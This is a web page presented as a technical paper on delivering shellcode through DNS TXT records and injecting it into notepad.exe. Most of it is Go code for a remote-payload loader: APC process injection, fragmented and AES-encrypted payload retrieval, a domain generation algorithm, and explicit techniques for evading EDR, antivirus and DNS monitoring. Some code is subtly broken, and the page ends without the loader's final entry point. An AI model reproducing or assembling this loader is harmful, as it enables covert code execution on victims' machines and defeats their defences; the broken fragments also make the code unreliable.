<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="A technical paper on advanced shellcode injection via DNS, addressing modern security challenges.">
    <title>Advanced Shellcode Injection via DNS</title>
    <style>
        :root {
            --bg-color: #1a1a1a;
            --text-color: #e0e0e0;
            --primary-color: #1e90ff;
            --secondary-color: #ff5555;
            --code-bg: #2d2d2d;
            --card-bg: #252525;
            --border-color: #444;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            line-height: 1.7;
            max-width: 1000px;
            margin: 0 auto;
            padding: 40px 20px;
            background-color: var(--bg-color);
            color: var(--text-color);
        }

        header {
            text-align: center;
            padding: 20px 0;
            border-bottom: 1px solid var(--border-color);
            margin-bottom: 40px;
        }

        h1 {
            font-size: 2.5em;
            color: var(--primary-color);
            margin-bottom: 10px;
        }

        h2 {
            font-size: 1.8em;
            color: var(--primary-color);
            border-bottom: 2px solid var(--primary-color);
            padding-bottom: 8px;
            margin: 30px 0 20px;
        }

        h3 {
            font-size: 1.4em;
            color: #ffffff;
            margin: 20px 0 15px;
        }

        p {
            margin-bottom: 20px;
            text-align: justify;
        }

        ul, ol {
            margin-bottom: 20px;
            padding-left: 30px;
        }

        li {
            margin-bottom: 12px;
        }

        .section {
            background-color: var(--card-bg);
            padding: 25px;
            border-radius: 10px;
            margin-bottom: 30px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            transition: transform 0.2s ease;
        }

        .section:hover {
            transform: translateY(-5px);
        }

        pre {
            background-color: var(--code-bg);
            color: #d4d4d4;
            padding: 20px;
            border-radius: 8px;
            overflow-x: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.95em;
            line-height: 1.5;
            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.2);
        }

        code {
            font-family: 'JetBrains Mono', monospace;
            background-color: #333;
            padding: 2px 6px;
            border-radius: 4px;
            color: #f0f0f0;
        }

        pre code {
            background-color: transparent;
            padding: 0;
        }

        .code-comment { color: #6a9955; }
        .code-keyword { color: #569cd6; }
        .code-string { color: #ce9178; }
        .code-number { color: #b5cea8; }

        .highlight {
            color: var(--secondary-color);
            font-weight: bold;
        }

        footer {
            text-align: center;
            padding: 20px 0;
            border-top: 1px solid var(--border-color);
            margin-top: 40px;
            font-size: 0.9em;
            color: #888;
        }

        a {
            color: var(--primary-color);
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            body {
                padding: 20px;
            }
            h1 {
                font-size: 2em;
            }
            h2 {
                font-size: 1.5em;
            }
        }
    </style>
</head>
<body>
    <header>
        <h1>Advanced Shellcode Injection via DNS: Addressing Security Challenges and Technical Limitations</h1>
    </header>

    <main>
        <section class="section" id="abstract">
            <h2>Abstract</h2>
            <p>Shellcode injection through DNS queries to retrieve remote payloads is an advanced technique for executing code in target processes, such as <code>notepad.exe</code>. However, it faces significant obstacles due to modern security mechanisms like Address Space Layout Randomization (ASLR), Data Execution Prevention (DEP), Endpoint Detection and Response (EDR) systems, network monitoring, DNS TXT record size limitations, process instability, and domain detection. This paper proposes a comprehensive framework addressing these limitations through Position-Independent Code (PIC), Return-Oriented Programming (ROP) to bypass DEP, alternative injection techniques like APC and AtomBombing to evade EDR, Domain Generation Algorithms (DGA) for stealthy DNS traffic, shellcode fragmentation and compression, and mechanisms to ensure target process stability. Based on cybersecurity advancements up to 2025, this work includes Go implementations and evaluation strategies, designed exclusively for educational purposes in authorized environments, emphasizing ethics and legal compliance.</p>
        </section>

        <section class="section" id="introduction">
            <h2>Introduction</h2>
            <p>Shellcode injection involves inserting and executing machine code in a running process's memory, often to achieve remote code execution (RCE) or persistence. Here, the shellcode is retrieved via DNS queries (TXT records) and injected into <code>notepad.exe</code> on a Windows system. DNS-based delivery is stealthy due to the ubiquity of DNS traffic but faces multiple challenges:</p>
            <ul>
                <li><strong class="highlight">ASLR</strong>: Randomizes memory addresses, complicating references to fixed locations.</li>
                <li><strong class="highlight">DEP</strong>: Blocks code execution in non-executable memory regions.</li>
                <li><strong class="highlight">EDR and Antivirus</strong>: Detect APIs like <code>CreateRemoteThread</code> and suspicious DNS traffic.</li>
                <li><strong class="highlight">DNS Limitations</strong>: TXT records are limited to 255 bytes per string, restricting large payloads.</li>
                <li><strong class="highlight">Process Stability</strong>: Injection can cause crashes if not handled carefully.</li>
                <li><strong class="highlight">Target Process Dependency</strong>: Requires <code>notepad.exe</code> to be running.</li>
                <li><strong class="highlight">Domain Detection</strong>: Static domains in Cloudflare can be blocked or flagged.</li>
            </ul>
            <p>These obstacles limit effectiveness in modern environments (Windows 10/11 with EDRs like Microsoft Defender). This paper proposes advanced solutions, integrating techniques like ROP, APC injection, DGA, and fragmentation, with Go implementations and evaluation metrics for controlled testing.</p>
        </section>

        <section class="section" id="section-1">
            <h2>Section 1: Overcoming Address Space Layout Randomization (ASLR)</h2>
            <p>ASLR randomizes the base addresses of memory segments, breaking shellcodes that rely on fixed addresses for accessing functions or data.</p>
            <h3>Solution: Position-Independent Code (PIC)</h3>
            <p>The shellcode must be Position-Independent Code (PIC), resolving addresses dynamically at runtime. This is achieved by:</p>
            <ol>
                <li><strong>Dynamic API Resolution</strong>:
                    <ul>
                        <li>Access the Process Environment Block (PEB) to locate loaded modules (e.g., <code>kernel32.dll</code>).</li>
                        <li>Use a hash algorithm (e.g., ROR-13) to find function names in the export table.</li>
                        <li>Call functions like <code>GetProcAddress</code> to load required APIs.</li>
                    </ul>
                </li>
                <li><strong>Implementation Steps</strong>:
                    <ul>
                        <li>Traverse the PEB's <code>PEB_LDR_DATA</code> module list.</li>
                        <li>Extract the base address of <code>kernel32.dll</code>.</li>
                        <li>Search for functions like <code>LoadLibraryA</code> and <code>GetProcAddress</code> by their hash.</li>
                        <li>Use these functions to invoke other APIs or execute the payload.</li>
                    </ul>
                </li>
            </ol>
            <p><strong>Example PIC Shellcode (x86-64 Assembly):</strong></p>
            <pre><code class="lang-asm"><span class="code-comment">; PIC shellcode to execute calc.exe</span>
<span class="code-keyword">BITS</span> <span class="code-number">64</span>
<span class="code-keyword">global</span> _start
<span class="code-keyword">_start:</span>
    <span class="code-keyword">xor</span> <span class="code-keyword">rdx</span>, <span class="code-keyword">rdx</span>
    <span class="code-keyword">mov</span> <span class="code-keyword">rbx</span>, [<span class="code-keyword">gs</span>:<span class="code-keyword">rdx</span>+<span class="code-number">0x60</span>]  <span class="code-comment">; Access PEB</span>
    <span class="code-keyword">mov</span> <span class="code-keyword">rbx</span>, [<span class="code-keyword">rbx</span>+<span class="code-number">0x18</span>]     <span class="code-comment">; PEB_LDR_DATA</span>
    <span class="code-keyword">mov</span> <span class="code-keyword">rbx</span>, [<span class="code-keyword">rbx</span>+<span class="code-number">0x20</span>]     <span class="code-comment">; InMemoryOrderModuleList</span>
    <span class="code-keyword">mov</span> <span class="code-keyword">rbx</span>, [<span class="code-keyword">rbx</span>]          <span class="code-comment">; ntdll.dll</span>
    <span class="code-keyword">mov</span> <span class="code-keyword">rbx</span>, [<span class="code-keyword">rbx</span>]          <span class="code-comment">; kernel32.dll</span>
    <span class="code-keyword">mov</span> <span class="code-keyword">rbp</span>, [<span class="code-keyword">rbx</span>+<span class="code-number">0x10</span>]     <span class="code-comment">; Base address of kernel32.dll</span>

    <span class="code-comment">; Resolve GetProcAddress via hash (simplified)</span>
    <span class="code-comment">; ... (hash logic and export table search)</span>

    <span class="code-comment">; Use resolved functions to execute calc.exe</span>
    <span class="code-comment">; ...</span>
</code></pre>
            <p>This shellcode is generated using tools like <code>msfvenom</code> (<code>-f raw</code>) and embedded in Go as a byte array. It bypasses ASLR by avoiding fixed addresses.</p>
            <h3>Integration in Go</h3>
            <p>The DNS retrieval function ensures the shellcode is PIC-compliant before injection, guaranteeing ASLR compatibility.</p>
        </section>

        <section class="section" id="section-2">
            <h2>Section 2: Bypassing Data Execution Prevention (DEP)</h2>
            <p>DEP prevents code execution in non-executable memory pages. Using <code>PAGE_EXECUTE_READWRITE</code> in <code>VirtualAllocEx</code> is detectable by modern security tools.</p>
            <h3>Solution: Return-Oriented Programming (ROP)</h3>
            <p>ROP chains existing code snippets ("gadgets") ending in RET to perform operations without new executable memory. Steps include:</p>
            <ol>
                <li><strong>Gadget Identification</strong>:
                    <ul>
                        <li>Use tools like <code>ROPgadget</code> to analyze loaded modules (e.g., <code>ntdll.dll</code>) for gadgets like <code>POP RAX; RET</code> or <code>MOV [RDI], RAX; RET</code>.</li>
                        <li>Prioritize modules with predictable or non-ASLR addresses (e.g., <code>kernel32.dll</code> in some contexts).</li>
                    </ul>
                </li>
                <li><strong>ROP Chain Construction</strong>:
                    <ul>
                        <li>Allocate writable (non-executable) memory for the shellcode.</li>
                        <li>Write the shellcode to this memory.</li>
                        <li>Create a ROP chain to call <code>VirtualProtect</code>, changing permissions to executable.</li>
                        <li>Transfer control to the shellcode.</li>
                    </ul>
                </li>
            </ol>
            <p><strong>Example ROP Chain (Conceptual):</strong></p>
            <ul>
                <li>Gadget 1: <code>POP RAX; RET</code> → Loads <code>PAGE_EXECUTE_READWRITE</code> into RAX.</li>
                <li>Gadget 2: <code>POP RCX; RET</code> → Loads the memory address into RCX.</li>
                <li>Gadget 3: <code>POP RDX; RET</code> → Loads the size into RDX.</li>
                <li>Gadget 4: <code>POP R8; RET</code> → Loads the old protection pointer.</li>
                <li>Gadget 5: <code>CALL VirtualProtect; RET</code> → Changes permissions and transfers control.</li>
            </ul>
            <p>The ROP chain is placed on the stack before injection, manipulating the return address.</p>
            <h3>Handling in Go</h3>
            <p>Injection is performed via APC (see Section 3) to queue the ROP chain execution, avoiding suspicious APIs.</p>
        </section>

        <section class="section" id="section-3">
            <h2>Section 3: Evading EDR and Antivirus Detection</h2>
            <p>EDRs (e.g., Microsoft Defender, CrowdStrike) monitor APIs like <code>CreateRemoteThread</code>, memory writes, and anomalous DNS traffic.</p>
            <h3>Solution: Alternative Injection Techniques</h3>
            <ol>
                <li><strong>APC Injection</strong>:
                    <ul>
                        <li>Queue execution in an existing thread's Asynchronous Procedure Call (APC) queue using <code>QueueUserAPC</code>, which is less monitored.</li>
                        <li>Steps:
                            <ul>
                                <li>Open a thread in the target process.</li>
                                <li>Allocate writable memory and write the shellcode or ROP chain.</li>
                                <li>Queue an APC to execute at the allocated address.</li>
                            </ul>
                        </li>
                    </ul>
                </li>
                <li><strong>AtomBombing</strong>:
                    <ul>
                        <li>Leverage Windows global atom tables to inject code without direct memory writes.</li>
                        <li>Steps:
                            <ul>
                                <li>Write the shellcode to an atom table using <code>GlobalAddAtom</code>.</li>
                                <li>Use APC to read the atom and execute the code.</li>
                            </ul>
                        </li>
                    </ul>
                </li>
                <li><strong>Pool Party Variants</strong>:
                    <ul>
                        <li>Use Windows thread pools for injection, bypassing EDR hooks on standard APIs.</li>
                    </ul>
                </li>
            </ol>
            <h3>Go Implementation for APC Injection</h3>
            <pre><code class="lang-go"><span class="code-comment">// APC injection to evade EDR</span>
<span class="code-keyword">func</span> injectViaAPC(processHandle <span class="code-keyword">windows</span>.Handle, shellcode []<span class="code-keyword">byte</span>) <span class="code-keyword">error</span> {
    <span class="code-comment">// Allocate memory</span>
    remoteAddr, err := <span class="code-keyword">windows</span>.VirtualAllocEx(processHandle, <span class="code-number">0</span>, uintptr(<span class="code-keyword">len</span>(shellcode)), <span class="code-keyword">windows</span>.MEM_COMMIT|<span class="code-keyword">windows</span>.MEM_RESERVE, <span class="code-keyword">windows</span>.PAGE_READWRITE)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> fmt.Errorf(<span class="code-string">"error allocating memory: %v"</span>, err)
    }

    <span class="code-comment">// Write shellcode or ROP chain</span>
    <span class="code-keyword">var</span> bytesWritten <span class="code-keyword">uintptr</span>
    err = <span class="code-keyword">windows</span>.WriteProcessMemory(processHandle, remoteAddr, &shellcode[<span class="code-number">0</span>], <span class="code-keyword">uintptr</span>(<span class="code-keyword">len</span>(shellcode)), &bytesWritten)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> fmt.Errorf(<span class="code-string">"error writing shellcode: %v"</span>, err)
    }

    <span class="code-comment">// Find a thread in the process</span>
    snapshot, err := <span class="code-keyword">windows</span>.CreateToolhelp32Snapshot(<span class="code-keyword">windows</span>.TH32CS_SNAPTHREAD, <span class="code-number">0</span>)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> fmt.Errorf(<span class="code-string">"error creating thread snapshot: %v"</span>, err)
    }
    <span class="code-keyword">defer</span> <span class="code-keyword">windows</span>.CloseHandle(snapshot)

    <span class="code-keyword">var</span> te <span class="code-keyword">windows</span>.ThreadEntry32
    te.Size = <span class="code-keyword">uint32</span>(<span class="code-keyword">unsafe</span>.Sizeof(te))
    err = <span class="code-keyword">windows</span>.Thread32First(snapshot, &te)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> fmt.Errorf(<span class="code-string">"error retrieving first thread: %v"</span>, err)
    }

    <span class="code-keyword">for</span> {
        <span class="code-keyword">if</span> te.OwnerProcessID == pid { <span class="code-comment">// pid obtained earlier</span>
            threadHandle, err := <span class="code-keyword">windows</span>.OpenThread(<span class="code-keyword">windows</span>.THREAD_SET_CONTEXT|<span class="code-keyword">windows</span>.THREAD_SUSPEND_RESUME|<span class="code-keyword">windows</span>.THREAD_GET_CONTEXT, <span class="code-keyword">false</span>, te.ThreadID)
            <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
                <span class="code-keyword">continue</span>
            }
            <span class="code-keyword">defer</span> <span class="code-keyword">windows</span>.CloseHandle(threadHandle)

            <span class="code-comment">// Queue APC</span>
            _, err = <span class="code-keyword">windows</span>.QueueUserAPC(remoteAddr, threadHandle, <span class="code-number">0</span>)
            <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
                <span class="code-keyword">return</span> fmt.Errorf(<span class="code-string">"error queuing APC: %v"</span>, err)
            }
            <span class="code-keyword">break</span>
        }
        err = <span class="code-keyword">windows</span>.Thread32Next(snapshot, &te)
        <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
            <span class="code-keyword">break</span>
        }
    }
    <span class="code-keyword">return</span> <span class="code-keyword">nil</span>
}
</code></pre>
            <p>This technique replaces <code>CreateRemoteThread</code>, reducing EDR detection likelihood.</p>
        </section>

        <section class="section" id="section-4">
            <h2>Section 4: Handling Large Shellcodes in DNS TXT Records</h2>
            <p>DNS TXT records are limited to 255 bytes per string, challenging large shellcode transmission.</p>
            <h3>Solution: Fragmentation, Compression, and Multi-String TXT</h3>
            <ol>
                <li><strong>Fragmentation</strong>:
                    <ul>
                        <li>Split the shellcode into chunks, each stored in a different subdomain (e.g., <code>shellcode1.example.com</code>, <code>shellcode2.example.com</code>).</li>
                        <li>Include a header in each chunk (e.g., chunk ID and total count) for reassembly.</li>
                    </ul>
                </li>
                <li><strong>Compression</strong>:
                    <ul>
                        <li>Compress the shellcode with algorithms like Snappy or LZMA before hex-encoding to reduce size.</li>
                    </ul>
                </li>
                <li><strong>Multi-String TXT Records</strong>:
                    <ul>
                        <li>Cloudflare allows multiple strings in a single TXT record, concatenated client-side.</li>
                    </ul>
                </li>
            </ol>
            <p><strong>Cloudflare Configuration</strong>:</p>
            <ul>
                <li>For a 600-byte shellcode split into three 200-byte chunks:
                    <ul>
                        <li>Record 1: <code>shellcode1.example.com</code> → TXT: <code>0103[200_bytes_hex]</code></li>
                        <li>Record 2: <code>shellcode2.example.com</code> → TXT: <code>0203[200_bytes_hex]</code></li>
                        <li>Record 3: <code>shellcode3.example.com</code> → TXT: <code>0303[200_bytes_hex]</code></li>
                    </ul>
                </li>
                <li>The prefix <code>0103</code> indicates "chunk 1 of 3," and so on.</li>
            </ul>
            <h3>Go Implementation</h3>
            <pre><code class="lang-go"><span class="code-keyword">import</span> (
    <span class="code-string">"fmt"</span>
    <span class="code-string">"github.com/miekg/dns"</span>
    <span class="code-string">"github.com/golang/snappy"</span>
)

<span class="code-comment">// Retrieve fragmented shellcode from DNS</span>
<span class="code-keyword">func</span> getFragmentedShellcodeFromDNS(baseDomain <span class="code-keyword">string</span>, numChunks <span class="code-keyword">int</span>) ([]<span class="code-keyword">byte</span>, <span class="code-keyword">error</span>) {
    <span class="code-keyword">var</span> fragments [][]<span class="code-keyword">byte</span>
    <span class="code-keyword">for</span> i := <span class="code-number">1</span>; i <= numChunks; i++ {
        domain := fmt.Sprintf(<span class="code-string">"shellcode%d.%s"</span>, i, baseDomain)
        chunk, err := getShellcodeFromDNS(domain)
        <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
            <span class="code-keyword">return</span> <span class="code-keyword">nil</span>, fmt.Errorf(<span class="code-string">"error retrieving chunk %d: %v"</span>, i, err)
        }
        fragments = <span class="code-keyword">append</span>(fragments, chunk)
    }

    <span class="code-comment">// Reassemble fragments</span>
    <span class="code-keyword">var</span> shellcode []<span class="code-keyword">byte</span>
    <span class="code-keyword">for</span> _, frag := <span class="code-keyword">range</span> fragments {
        <span class="code-comment">// Skip header (e.g., "0103")</span>
        shellcode = <span class="code-keyword">append</span>(shellcode, frag[<span class="code-number">4</span>:]...)
    }

    <span class="code-comment">// Decompress if compressed</span>
    decompressed, err := snappy.Decode(<span class="code-keyword">nil</span>, shellcode)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> <span class="code-keyword">nil</span>, fmt.Errorf(<span class="code-string">"error decompressing shellcode: %v"</span>, err)
    }
    <span class="code-keyword">return</span> decompressed, <span class="code-keyword">nil</span>
}
</code></pre>
            <p>Configure Cloudflare with fragmented TXT records, ensuring each chunk includes a reassembly header.</p>
        </section>

        <section class="section" id="section-5">
            <h2>Section 5: Evading DNS Traffic Monitoring</h2>
            <p>DNS traffic can be monitored by firewalls or solutions like Cisco Umbrella, detecting queries to suspicious domains or anomalous patterns.</p>
            <h3>Solution: Domain Generation Algorithms (DGA) and Encryption</h3>
            <ol>
                <li><strong>DGA</strong>:
                    <ul>
                        <li>Generate dynamic domains using a shared seed-based algorithm (e.g., current date).</li>
                        <li>Example: An algorithm generates <code>a1b2c3d4e5.example.com</code> based on a date hash.</li>
                        <li>Register only the base domain (<code>example.com</code>) in Cloudflare, configuring dynamic TXT records.</li>
                    </ul>
                </li>
                <li><strong>Encryption</strong>:
                    <ul>
                        <li>Encrypt the shellcode with XOR or AES before storing in TXT records, using a shared key.</li>
                        <li>Decrypt on the client after retrieving chunks.</li>
                    </ul>
                </li>
                <li><strong>Stealthy Traffic</strong>:
                    <ul>
                        <li>Space DNS queries to mimic legitimate traffic.</li>
                        <li>Use common TLDs (e.g., <code>.com</code>, <code>.org</code>) to reduce suspicion.</li>
                    </ul>
                </li>
            </ol>
            <h3>Go Implementation for DGA and Encryption</h3>
            <pre><code class="lang-go"><span class="code-keyword">import</span> (
    <span class="code-string">"crypto/aes"</span>
    <span class="code-string">"crypto/cipher"</span>
    <span class="code-string">"crypto/sha256"</span>
    <span class="code-string">"encoding/hex"</span>
    <span class="code-string">"time"</span>
)

<span class="code-comment">// Generate DGA domain based on date</span>
<span class="code-keyword">func</span> generateDGADomain() <span class="code-keyword">string</span> {
    seed := time.Now().Unix()
    h := sha256.New()
    h.Write([]<span class="code-keyword">byte</span>(fmt.Sprintf(<span class="code-string">"%d"</span>, seed)))
    hash := hex.EncodeToString(h.Sum(<span class="code-keyword">nil</span>))
    <span class="code-keyword">return</span> hash[:<span class="code-number">10</span>] + <span class="code-string">".example.com"</span>
}

<span class="code-comment">// Decrypt shellcode</span>
<span class="code-keyword">func</span> decryptShellcode(shellcode []<span class="code-keyword">byte</span>, key []<span class="code-keyword">byte</span>) ([]<span class="code-keyword">byte</span>, <span class="code-keyword">error</span>) {
    block, err := aes.NewCipher(key)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> <span class="code-keyword">nil</span>, err
    }
    <span class="code-keyword">if</span> <span class="code-keyword">len</span>(shellcode) < aes.BlockSize {
        <span class="code-keyword">return</span> <span class="code-keyword">nil</span>, fmt.Errorf(<span class="code-string">"shellcode too short"</span>)
    }
    iv := shellcode[:aes.BlockSize]
    shellcode = shellcode[aes.BlockSize:]
    stream := cipher.NewCFBDecrypter(block, iv)
    stream.XORKeyStream(shellcode, shellcode)
    <span class="code-keyword">return</span> shellcode, <span class="code-keyword">nil</span>
}
</code></pre>
            <p>Configure Cloudflare with TXT records for generated domains, storing encrypted shellcode.</p>
        </section>

        <section class="section" id="section-6">
            <h2>Section 6: Ensuring Process Stability and Dynamic Target Selection</h2>
            <p>Injection can crash <code>notepad.exe</code> if the shellcode disrupts threads or overflows buffers.</p>
            <h3>Solution: Stable Shellcode and Fallback Mechanisms</h3>
            <ol>
                <li><strong>Thread-Safe Shellcode</strong>:
                    <ul>
                        <li>Design PIC or ROP shellcode that preserves registers and stack state.</li>
                        <li>Use Structured Exception Handling (SEH) in the shellcode to catch errors.</li>
                    </ul>
                </li>
                <li><strong>Dynamic Process Start</strong>:
                    <ul>
                        <li>If <code>notepad.exe</code> is not running, start it silently with <code>CreateProcess</code>.</li>
                    </ul>
                </li>
                <li><strong>Error Handling</strong>:
                    <ul>
                        <li>Implement checks to detect injection failures and retry if necessary.</li>
                    </ul>
                </li>
            </ol>
            <h3>Go Implementation</h3>
            <pre><code class="lang-go"><span class="code-keyword">import</span> (
    <span class="code-string">"os/exec"</span>
    <span class="code-string">"golang.org/x/sys/windows"</span>
)

<span class="code-comment">// Ensure notepad.exe is running</span>
<span class="code-keyword">func</span> ensureNotepadRunning() (<span class="code-keyword">uint32</span>, <span class="code-keyword">error</span>) {
    pid, err := getNotepadPID()
    <span class="code-keyword">if</span> err == <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> pid, <span class="code-keyword">nil</span>
    }
    <span class="code-comment">// Start notepad.exe</span>
    cmd := exec.Command(<span class="code-string">"notepad.exe"</span>)
    <span class="code-keyword">if</span> err := cmd.Start(); err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> <span class="code-number">0</span>, fmt.Errorf(<span class="code-string">"error starting notepad: %v"</span>, err)
    }
    <span class="code-keyword">return</span> <span class="code-keyword">uint32</span>(cmd.Process.Pid), <span class="code-keyword">nil</span>
}
</code></pre>
        </section>

        <section class="section" id="section-7">
            <h2>Section 7: Integrated Implementation</h2>
            <p>The final code integrates all solutions:</p>
            <ul>
                <li><strong>DGA</strong>: Generates dynamic domains for DNS queries.</li>
                <li><strong>Fragmentation and Encryption</strong>: Retrieves fragmented, compressed, and encrypted PIC shellcode.</li>
                <li><strong>APC Injection</strong>: Uses APC to inject the shellcode or ROP chain into <code>notepad.exe</code>.</li>
                <li><strong>Stability</strong>: Ensures <code>notepad.exe</code> is running and handles errors.</li>
            </ul>
            <h3>Integrated Go Code</h3>
            <pre><code class="lang-go"><span class="code-keyword">package</span> main

<span class="code-keyword">import</span> (
    <span class="code-string">"fmt"</span>
    <span class="code-string">"log"</span>
    <span class="code-string">"golang.org/x/sys/windows"</span>
    <span class="code-string">"github.com/miekg/dns"</span>
    <span class="code-string">"github.com/golang/snappy"</span>
    <span class="code-string">"crypto/aes"</span>
    <span class="code-string">"crypto/cipher"</span>
    <span class="code-string">"crypto/sha256"</span>
    <span class="code-string">"encoding/hex"</span>
    <span class="code-string">"time"</span>
    <span class="code-string">"unsafe"</span>
    <span class="code-string">"os/exec"</span>
    <span class="code-string">"strings"</span>
)

<span class="code-keyword">const</span> (
    dnsServerHost = <span class="code-string">"ns1.example.com"</span> <span class="code-comment">// Cloudflare DNS server</span>
    baseDomain    = <span class="code-string">"example.com"</span>      <span class="code-comment">// Base domain for DGA</span>
    aesKey        = <span class="code-string">"16-byte-key-1234"</span> <span class="code-comment">// AES key (16 bytes)</span>
)

<span class="code-keyword">func</span> getNotepadPID() (<span class="code-keyword">uint32</span>, <span class="code-keyword">error</span>) {
    snapshot, err := <span class="code-keyword">windows</span>.CreateToolhelp32Snapshot(<span class="code-keyword">windows</span>.TH32CS_SNAPPROCESS, <span class="code-number">0</span>)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> <span class="code-number">0</span>, err
    }
    <span class="code-keyword">defer</span> <span class="code-keyword">windows</span>.CloseHandle(snapshot)

    <span class="code-keyword">var</span> entry <span class="code-keyword">windows</span>.ProcessEntry32
    entry.Size = <span class="code-keyword">uint32</span>(<span class="code-keyword">unsafe</span>.Sizeof(entry))
    err = <span class="code-keyword">windows</span>.Process32First(snapshot, &entry)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> <span class="code-number">0</span>, err
    }

    <span class="code-keyword">for</span> {
        <span class="code-keyword">if</span> strings.ToLower(<span class="code-keyword">windows</span>.UTF16ToString(entry.ExeFile[:])) == <span class="code-string">"notepad.exe"</span> {
            <span class="code-keyword">return</span> entry.ProcessID, <span class="code-keyword">nil</span>
        }
        err = <span class="code-keyword">windows</span>.Process32Next(snapshot, &entry)
        <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
            <span class="code-keyword">break</span>
        }
    }
    <span class="code-keyword">return</span> <span class="code-number">0</span>, fmt.Errorf(<span class="code-string">"notepad.exe not found"</span>)
}

<span class="code-keyword">func</span> ensureNotepadRunning() (<span class="code-keyword">uint32</span>, <span class="code-keyword">error</span>) {
    pid, err := getNotepadPID()
    <span class="code-keyword">if</span> err == <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> pid, <span class="code-keyword">nil</span>
    }
    cmd := exec.Command(<span class="code-string">"notepad.exe"</span>)
    <span class="code-keyword">if</span> err := cmd.Start(); err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> <span class="code-number">0</span>, fmt.Errorf(<span class="code-string">"error starting notepad: %v"</span>, err)
    }
    <span class="code-keyword">return</span> <span class="code-keyword">uint32</span>(cmd.Process.Pid), <span class="code-keyword">nil</span>
}

<span class="code-keyword">func</span> generateDGADomain() <span class="code-keyword">string</span> {
    seed := time.Now().Unix()
    h := sha256.New()
    h.Write([]<span class="code-keyword">byte</span>(fmt.Sprintf(<span class="code-string">"%d"</span>, seed)))
    hash := hex.EncodeToString(h.Sum(<span class="code-keyword">nil</span>))
    <span class="code-keyword">return</span> hash[:<span class="code-number">10</span>] + <span class="code-string">"."</span> + baseDomain
}

<span class="code-keyword">func</span> getShellcodeFromDNS(domain <span class="code-keyword">string</span>) ([]<span class="code-keyword">byte</span>, <span class="code-keyword">error</span>) {
    client := <span class="code-keyword">new</span>(dns.Client)
    msg := <span class="code-keyword">new</span>(dns.Msg)
    msg.SetQuestion(dns.Fqdn(domain), dns.TypeTXT)
    msg.RecursionDesired = <span class="code-keyword">true</span>

    resp, _, err := client.Exchange(msg, dnsServerHost+<span class="code-string">":53"</span>)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> <span class="code-keyword">nil</span>, err
    }
    <span class="code-keyword">if</span> <span class="code-keyword">len</span>(resp.Answer) == <span class="code-number">0</span> {
        <span class="code-keyword">return</span> <span class="code-keyword">nil</span>, fmt.Errorf(<span class="code-string">"no TXT records received"</span>)
    }

    <span class="code-keyword">var</span> shellcode []<span class="code-keyword">byte</span>
    <span class="code-keyword">for</span> _, ans := <span class="code-keyword">range</span> resp.Answer {
        <span class="code-keyword">if</span> txt, ok := ans.(*dns.TXT); ok {
            <span class="code-keyword">for</span> _, data := <span class="code-keyword">range</span> txt.Txt {
                hexData := strings.ReplaceAll(data, <span class="code-string">" "</span>, <span class="code-string">""</span>)
                <span class="code-keyword">for</span> i := <span class="code-number">0</span>; i < <span class="code-keyword">len</span>(hexData); i += <span class="code-number">2</span> {
                    <span class="code-keyword">var</span> b <span class="code-keyword">byte</span>
                    _, err := fmt.Sscanf(hexData[i:i+<span class="code-number">2</span>], <span class="code-string">"%02x"</span>, &b)
                    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
                        <span class="code-keyword">return</span> <span class="code-keyword">nil</span>, err
                    }
                    shellcode = <span class="code-keyword">append</span>(shellcode, b)
                }
            }
        }
    }
    <span class="code-keyword">return</span> shellcode, <span class="code-keyword">nil</span>
}

<span class="code-keyword">func</span> getFragmentedShellcodeFromDNS(numChunks <span class="code-keyword">int</span>) ([]<span class="code-keyword">byte</span>, <span class="code-keyword">error</span>) {
    <span class="code-keyword">var</span> fragments [][]<span class="code-keyword">byte</span>
    <span class="code-keyword">for</span> i := <span class="code-number">1</span>; i <= numChunks; i++ {
        domain := generateDGADomain()
        chunk, err := getShellcodeFromDNS(domain)
        <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
            <span class="code-keyword">return</span> <span class="code-keyword">nil</span>, err
        }
        fragments = <span class="code-keyword">append</span>(fragments, chunk)
    }

    <span class="code-keyword">var</span> shellcode []<span class="code-keyword">byte</span>
    <span class="code-keyword">for</span> _, frag := <span class="code-keyword">range</span> fragments {
        shellcode = <span class="code-keyword">append</span>(shellcode, frag[<span class="code-number">4</span>:]...) <span class="code-comment">// Skip header</span>
    }

    decompressed, err := snappy.Decode(<span class="code-keyword">nil</span>, shellcode)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> <span class="code-keyword">nil</span>, err
    }

    <span class="code-keyword">return</span> decryptShellcode(decompressed, []<span class="code-keyword">byte</span>(aesKey))
}

